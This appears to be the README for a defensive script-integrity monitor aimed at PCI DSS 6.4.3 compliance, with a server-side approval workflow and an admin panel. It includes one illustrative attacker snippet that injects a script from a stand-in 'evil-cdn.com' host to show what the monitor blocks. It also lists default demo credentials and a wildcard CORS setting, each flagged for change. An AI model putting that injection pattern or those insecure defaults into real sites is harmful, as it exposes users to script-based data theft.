# Script Integrity Monitor - Enhanced Edition

Production-ready PCI DSS v4.0 Requirement 6.4.3 compliance solution with automatic file detection and server-side approval workflow.

## Features

### Core Monitoring
- Real-time script integrity verification using SHA-384 cryptographic hashes
- Detection of unauthorized script modifications
- Comprehensive script inventory with timestamps and metadata
- Monitoring of static, dynamic, and iframe scripts
- Support for both enforcement and report-only modes
- **DOM method overrides** to intercept dynamic script injection (NEW)

### Enhanced Auto-Detection (NEW)
- **Automatic detection** of ALL new scripts (never seen before)
- **Intelligent categorization**: NEW, KNOWN-CHANGED, APPROVED
- **Auto-registration** with server for approval workflow
- **Client-side polling** for approval status updates
- **Real-time violation** reporting

### Server-Side Approval Workflow (NEW)
- **Database integration** (SQLite for dev, PostgreSQL for production)
- **Approval queue management** with admin panel
- **Business justification** tracking (PCI DSS requirement)
- **Complete audit trail** with 7-year retention
- **Role-based access control** for admin users
- **Email/Slack notifications** for new scripts and violations

### Admin Dashboard (NEW)
- **Real-time statistics** (scripts, violations, compliance status)
- **Pending approval queue** with script details
- **Violation monitoring** and investigation tools
- **Search and filter** capabilities
- **Bulk approval/rejection** operations with multi-select checkboxes (NEW)
- **Select all/none** functionality for efficient batch processing (NEW)
- **Audit log viewing** per script

## Quick Start

### 1. Installation

```bash
# Clone or navigate to project directory
cd /path/to/jscrambler

# Install dependencies
npm install

# Copy environment template
cp .env.example .env

# Edit .env with your configuration
nano .env
```

### 2. Initialize Database

```bash
npm run db:init
```

This creates the database and default admin user.

### 3. Start Server

```bash
# Development (with auto-reload)
npm run dev

# Production
npm start
```

### 4. Access Admin Panel

Open browser to: `http://localhost:3000/admin-panel.html`

**Default Credentials:**
- API Token: `demo-token-12345`

**⚠️ IMPORTANT: Change default credentials in production!**

### 5. Integrate Client-Side

Add to your HTML pages (must be FIRST scripts):

```html
<!DOCTYPE html>
<html>
<head>
  <!-- CRITICAL: Load configuration FIRST -->
  <script src="/js/script-integrity-config.js"></script>

  <!-- CRITICAL: Load monitor SECOND -->
  <script src="/js/script-integrity-monitor.js"></script>

  <!-- Other scripts (these will be monitored) -->
  <script src="https://cdn.example.com/library.js"></script>
</head>
<body>
  <!-- Your content -->
</body>
</html>
```

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                         BROWSER (Client)                        │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  script-integrity-monitor.js                              │  │
│  │  - Detects all scripts                                    │  │
│  │  - Calculates SHA-384 hashes                              │  │
│  │  - Auto-registers new scripts                             │  │
│  │  - Polls for approval status                              │  │
│  │  - Reports violations                                      │  │
│  │  - Intercepts dynamic script injection (NEW)              │  │
│  └───────────────────┬──────────────────────────────────────┘  │
└────────────────────────┼─────────────────────────────────────────┘
                         │ HTTPS/POST
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│                      SERVER (Node.js/Express)                   │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  server-alert-handler.js                                  │  │
│  │  - API endpoints                                          │  │
│  │  - Authentication                                         │  │
│  │  - Rate limiting                                          │  │
│  │  - Notification queue                                     │  │
│  └───────────────────┬──────────────────────────────────────┘  │
│                      │                                          │
│  ┌──────────────────▼──────────────────────────────────────┐  │
│  │  database-manager.js                                      │  │
│  │  - Database abstraction                                   │  │
│  │  - Query interface                                        │  │
│  │  - Transaction support                                    │  │
│  └───────────────────┬──────────────────────────────────────┘  │
└────────────────────────┼─────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│                     DATABASE (SQLite/PostgreSQL)                │
│  - Scripts inventory (approval status, hashes, metadata)        │
│  - Integrity violations (detected issues, severity)             │
│  - Approval audit log (who, when, why)                          │
│  - Admin users (authentication, roles)                          │
│  - Notification queue (alerts pending delivery)                 │
└─────────────────────────────────────────────────────────────────┘
```

## Workflow

### Script Detection & Approval

1. **Browser detects script** → Calculate SHA-384 hash
2. **Check baseline config** → Is it a known script?
   - **YES + hash matches** → APPROVED, allow execution
   - **YES + hash changed** → VIOLATION, report to server, block/alert
   - **NO** → NEW SCRIPT, continue to step 3
3. **Check server status** → Has this hash been approved?
   - **YES (approved)** → Allow execution
   - **YES (rejected)** → Block/alert
   - **YES (pending)** → Report mode, poll for updates
   - **NO** → Auto-register with server
4. **Server registers script** → Store in database as "pending_approval"
5. **Admin reviews** → View in admin panel, approve or reject
6. **Client polls** → Check status every 30 seconds
7. **Status updated** → Client receives approved/rejected status
8. **Action taken** → Allow or block based on approval

## File Structure

```
jscrambler/
├── script-integrity-monitor.js       # Client-side monitoring (enhanced)
├── script-integrity-config.js        # Client configuration (enhanced)
├── server-alert-handler.js           # Server API (enhanced)
├── database-manager.js               # Database abstraction (NEW)
├── database-schema.sql               # Database schema (NEW)
├── public/
│   └── admin-panel.html              # Admin dashboard (NEW)
├── scripts/
│   ├── init-database.js              # Database initialization (NEW)
│   └── cleanup-old-records.js        # Maintenance script
├── data/
│   └── integrity-monitor.db          # SQLite database (created on init)
├── .env.example                      # Environment template (NEW)
├── .env                              # Your configuration (create from .env.example)
├── package.json                      # Dependencies
├── APPROVAL-WORKFLOW.md              # Workflow documentation (NEW)
└── README.md                         # This file
```

## API Endpoints

### Public Endpoints (No Authentication)

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/scripts/register` | Register newly discovered script |
| GET | `/api/scripts/status/:hash` | Check script approval status |
| POST | `/api/scripts/violation` | Report integrity violation |
| GET | `/health` | Health check |

### Admin Endpoints (Authentication Required)

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/admin/dashboard` | Get statistics |
| GET | `/api/admin/scripts/pending` | Get pending approvals |
| POST | `/api/admin/scripts/:id/approve` | Approve a script |
| POST | `/api/admin/scripts/:id/reject` | Reject a script |
| POST | `/api/admin/scripts/bulk-approve` | Bulk approve multiple scripts (NEW) |
| POST | `/api/admin/scripts/bulk-reject` | Bulk reject multiple scripts (NEW) |
| GET | `/api/admin/violations` | Get violations |
| GET | `/api/admin/scripts/search` | Search scripts |
| POST | `/api/admin/violations/:id/review` | Update violation review |

## Configuration

### Client-Side (script-integrity-config.js)

```javascript
window.SCRIPT_INTEGRITY_CONFIG = {
  // Hash algorithm
  hashAlgorithm: 'SHA-384',

  // Mode: 'report' (monitor only) or 'enforce' (block violations)
  // In enforce mode, blocks: HASH_MISMATCH, SRI_MISMATCH, REJECTED_BY_ADMIN, NO_BASELINE_HASH, UNAUTHORIZED_SCRIPT
  // Does NOT block: PENDING_APPROVAL, NEW_SCRIPT (allows time for admin review)
  mode: 'report',

  // Server integration
  serverBaseUrl: 'http://localhost:3000',
  autoRegisterNewScripts: true,
  pollApprovalStatus: true,
  pollInterval: 30000,

  // Baseline hashes for known scripts
  baselineHashes: {
    'https://cdn.example.com/jquery.js': 'sha384-...'
  },

  // Whitelisted sources
  whitelistedSources: [
    /^https:\/\/trusted-cdn\.com\//
  ]
};
```

### Server-Side (.env)

```env
# Database
DB_TYPE=sqlite
SQLITE_PATH=./data/integrity-monitor.db

# Server
PORT=3000
NODE_ENV=development

# Security
CORS_ORIGIN=*
IP_SALT=change-in-production

# See .env.example for all options
```

## Dynamic Script Injection Protection

The Script Integrity Monitor includes **DOM method overrides** to intercept and block dynamic script injection attempts. This provides defense-in-depth protection against:

- Malicious third-party scripts injecting additional scripts
- Browser extensions modifying page behavior
- XSS attacks attempting to load external malware
- Supply chain attacks via compromised dependencies

### How It Works

The monitor overrides key DOM methods to intercept script creation and insertion:

```javascript
// Intercepted methods:
document.createElement('script')           // Script element creation
Element.prototype.appendChild()            // Inserting scripts into DOM
Element.prototype.insertBefore()           // Inserting before reference node
Element.prototype.replaceChild()           // Replacing elements with scripts
HTMLScriptElement.src property             // Direct src assignment
HTMLScriptElement.setAttribute('src')      // Setting src via setAttribute
```

### Protection Flow

1. **Monitor initializes** → Saves references to original DOM methods
2. **Overrides installed** → Methods replaced with monitoring wrappers
3. **Script created/inserted** → Override intercepts the operation
4. **Approval check** → `shouldBlockDynamicScript()` checks blocked list
5. **Block or allow**:
   - **Blocked**: Script type changed to `blocked-by-integrity-monitor`
   - **Allowed**: Original method called, MutationObserver monitors

### Example: Blocking Malicious Injection

```javascript
// Attacker code (or compromised third-party script):
const malware = document.createElement('script');
malware.src = 'https://evil-cdn.com/steal-data.js';
document.body.appendChild(malware);

// Result with monitor in enforce mode:
// ✅ createElement intercepted
// ✅ appendChild intercepted
// ✅ Script blocked (type changed to 'blocked-by-integrity-monitor')
// ✅ Console warning: "🚫 Blocked script via appendChild: https://evil-cdn.com/steal-data.js"
// ❌ Malware never downloads or executes
```

### Testing Dynamic Injection Blocking

Open the test page to verify protection:

```bash
# Start server
npm start

# Open test page in browser
http://localhost:3000/test-dynamic-injection.html
```

The test page includes 7 comprehensive tests:
1. ✅ `createElement()` + `appendChild()`
2. ✅ `createElement()` + `insertBefore()`
3. ✅ `createElement()` + `replaceChild()`
4. ✅ `setAttribute('src')`
5. ✅ Direct `src` property assignment
6. ✅ Inline script via `createElement`
7. ✅ Script in dynamically created `div`

### Coverage & Limitations

**✅ Protects Against:**
- External scripts loaded dynamically after monitor initialization
- Inline scripts created programmatically
- Scripts injected by third-party code (ads, analytics, widgets)
- Scripts inserted via any DOM manipulation method

**⚠️ Limitations:**
- Scripts in original HTML (handled by MutationObserver with timing constraints)
- Attackers with code execution *before* monitor initialization could save original methods
- Not a replacement for CSP (use both for defense-in-depth)

**🔒 Best Practice:**
Load the Script Integrity Monitor as the **first script** on the page, before any other code executes.

## PCI DSS Compliance

This solution addresses PCI DSS v4.0 Requirement 6.4.3:

- ✅ **Script Authorization**: Admin approval workflow with business justification
- ✅ **Integrity Verification**: SHA-384 cryptographic hashes
- ✅ **Inventory Maintenance**: Complete database of all scripts
- ✅ **Written Justification**: Required for each approved script
- ✅ **Audit Trail**: Complete logs with 7-year retention
- ✅ **Regular Review**: Admin dashboard for ongoing monitoring

## Security Features

- **Authentication**: Token-based auth for admin endpoints
- **Rate Limiting**: Per-session and per-IP limits
- **Input Validation**: All inputs sanitized, SQL injection prevention
- **Privacy**: IP addresses hashed before storage
- **CORS**: Configurable cross-origin policies
- **Audit Trail**: Complete logging of all approval decisions
- **Encryption**: HTTPS recommended for production

## Using Bulk Operations

The admin panel supports bulk approval and rejection of scripts for efficient workflow management.

### How to Use Bulk Operations

1. **Navigate to Pending Approvals**:
   - Log in to admin panel: http://localhost:3000/admin-panel.html
   - Click on "Pending Approvals" tab

2. **Select Scripts**:
   - Click individual checkboxes next to scripts
   - Or click the header checkbox to select all
   - Or use "Select All" / "Select None" buttons

3. **Bulk Approve**:
   - Click "Bulk Approve" button
   - Enter business justification when prompted
   - Enter script purpose (or use default)
   - Enter script owner (or use default)
   - Confirm the action
   - Selected scripts will be approved and removed from pending list

4. **Bulk Reject**:
   - Click "Bulk Reject" button
   - Enter rejection reason when prompted
   - Confirm the action
   - Selected scripts will be rejected and removed from pending list

### Bulk Operations Features

- **Multi-select**: Check individual scripts or use "Select All"
- **Selection Count**: Shows how many scripts are selected
- **Visual Feedback**: Bulk actions bar appears when scripts are selected
- **Indeterminate State**: Header checkbox shows partial selection state
- **Transaction Safety**: Uses database transactions for atomic updates
- **Partial Success**: Handles cases where some scripts succeed and others fail
- **Limit**: Maximum 100 scripts per bulk operation

### API Usage

Bulk approve multiple scripts:

```bash
POST /api/admin/scripts/bulk-approve
Content-Type: application/json
X-API-Token: your-token-here

{
  "scriptIds": [1, 2, 3],
  "businessJustification": "Reviewed and approved",
  "scriptPurpose": "Third-party analytics",
  "scriptOwner": "Engineering Team",
  "riskLevel": "low",
  "approvalNotes": "Bulk approved after security review"
}
```

Bulk reject multiple scripts:

```bash
POST /api/admin/scripts/bulk-reject
Content-Type: application/json
X-API-Token: your-token-here

{
  "scriptIds": [4, 5, 6],
  "rejectionReason": "Unauthorized third-party scripts",
  "notes": "Blocked per security policy"
}
```

Response format:

```json
{
  "success": true,
  "message": "Successfully approved 3 out of 3 scripts",
  "approved": 3,
  "failed": 0,
  "failedIds": []
}
```

## Development

### Database Migrations

The system automatically runs migrations on startup. Schema is in `database-schema.sql`.

### Adding New Admin Users

```javascript
// Use bcrypt to hash password
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash('password', 10);

// Insert into database
INSERT INTO admin_users (username, email, password_hash, api_token, role)
VALUES ('newadmin', 'admin@example.com', hash, 'token', 'admin');
```

### Generating Baseline Hashes

In browser console:

```javascript
// Generate hashes for all scripts on current page
SCRIPT_INTEGRITY_CONFIG.generateBaselineHashes();

// Copy output and add to baselineHashes configuration
```

## Docker Deployment

The application can be easily deployed using Docker. See [DOCKER.md](DOCKER.md) for complete Docker deployment guide.

### Quick Start with Docker

```bash
# Using Docker Compose (recommended)
docker-compose up -d
```

This will start:
- PostgreSQL container (database)
- Application container (server)

The containers will automatically:
- Initialize the PostgreSQL database on first run
- Create the default admin user
- Start the server on port 3000
- Persist database data in Docker volume `postgres-data`

Access the admin panel at: http://localhost:3000/admin-panel.html

**Default PostgreSQL credentials:**
- Database: `script_integrity`
- User: `postgres`
- Password: `postgres`

⚠️ **Change default credentials in production!**

## Production Deployment

### Pre-Deployment Checklist

- [ ] Change all default passwords and tokens
- [ ] Configure PostgreSQL database
- [ ] Set `NODE_ENV=production`
- [ ] Configure specific CORS origins
- [ ] Set up SSL/TLS certificates
- [ ] Configure email/Slack notifications
- [ ] Set proper `IP_SALT` and `SESSION_SECRET`
- [ ] Review and adjust rate limits
- [ ] Test disaster recovery
- [ ] Set up database backups
- [ ] Configure firewall rules

### PostgreSQL Setup

```sql
-- Create database
CREATE DATABASE script_integrity;

-- Create user
CREATE USER script_monitor WITH PASSWORD 'secure_password';

-- Grant permissions
GRANT ALL PRIVILEGES ON DATABASE script_integrity TO script_monitor;
```

Update `.env`:

```env
DB_TYPE=postgres
PG_HOST=localhost
PG_PORT=5432
PG_DATABASE=script_integrity
PG_USER=script_monitor
PG_PASSWORD=secure_password
```

### Nginx Reverse Proxy

```nginx
server {
    listen 443 ssl http2;
    server_name your-domain.com;

    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;

    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

## Monitoring & Maintenance

### Database Cleanup

```bash
# Run cleanup script to remove old records
node scripts/cleanup-old-records.js
```

### Health Monitoring

Check server health:

```bash
curl http://localhost:3000/health
```

Response:

```json
{
  "status": "healthy",
  "service": "script-integrity-monitor-server",
  "version": "2.0.0",
  "database": {
    "healthy": true,
    "type": "sqlite"
  },
  "timestamp": "2025-11-11T12:00:00.000Z"
}
```

### Logs

Monitor logs for:
- `[SIM]` - Client-side events
- `[DB]` - Database operations
- `[Server]` - Server events
- `[Admin]` - Admin actions
- `[Auth]` - Authentication events

## Troubleshooting

### Common Issues

**Problem: Scripts not auto-registering**

Solution: Check `serverBaseUrl` in config, verify server is running

**Problem: Admin login fails**

Solution: Check API token matches database, verify account is active

**Problem: Database connection fails**

Solution: Check file permissions (SQLite) or credentials (PostgreSQL)

**Problem: High false positive rate**

Solution: Start in report mode, generate accurate baseline hashes

See [APPROVAL-WORKFLOW.md](APPROVAL-WORKFLOW.md) for detailed troubleshooting.

## Documentation

- [APPROVAL-WORKFLOW.md](APPROVAL-WORKFLOW.md) - Complete workflow documentation
- [database-schema.sql](database-schema.sql) - Database structure
- [.env.example](.env.example) - Configuration options

## License

MIT License - See LICENSE file for details

## Support

For issues, questions, or contributions:
- Review documentation in `APPROVAL-WORKFLOW.md`
- Check troubleshooting section
- Contact your security team

## Version

**Version 2.0.0** - Enhanced with auto-detection and approval workflow

**Previous Version 1.0.0** - Basic monitoring only

---

**⚠️ IMPORTANT SECURITY NOTES:**

1. **NEVER commit `.env` file** to version control
2. **Change all default credentials** before production deployment
3. **Use HTTPS** in production (HTTP is for development only)
4. **Review PCI DSS requirements** and ensure compliance
5. **Regularly update** baseline hashes when scripts change
6. **Monitor violations** and respond to alerts promptly

---

**PCI DSS v4.0 Requirement 6.4.3 Compliance Achieved ✓**
